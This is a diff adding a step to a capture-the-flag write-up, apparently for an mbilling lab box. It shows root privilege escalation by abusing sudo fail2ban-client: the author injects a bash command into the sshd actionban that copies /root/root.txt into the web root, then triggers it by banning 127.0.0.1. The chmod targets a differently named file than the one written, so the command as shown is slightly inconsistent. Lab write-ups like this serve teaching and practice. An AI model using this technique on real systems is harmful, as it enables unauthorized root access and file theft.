@@ -59,4 +59,20 @@ we can access as the user we currently are.
 
 ![Screenshot 2025-03-09 005105](https://github.com/user-attachments/assets/d013ab47-9b8e-4644-b134-c4621fbb5149)
 
+To move the root flag over to a better area I ran this command:
+
+`sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /var/www/html/mbilling/lib/icepay/rootflag.txt && chmod 777 /var/www/html/mbilling/lib/icepay/root_exposed.txt'"`
+
+Here I modified an actionban rule to basically read the root file and then output that file to /var/www/html/mbilling/lib/icepay/. For this to work though, we need to force fail2ban to actually execute this action by banning the loopback IP address as shown below.
+
+`sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1`
+
+
+Now all we need to do is go to the directory and do `cat rootflag.txt` and then we are done!
+
+
+![Screenshot 2025-03-09 010053](https://github.com/user-attachments/assets/b408b4d6-7fb5-4c70-81f7-8ba0370908e9)
+
+
+
 
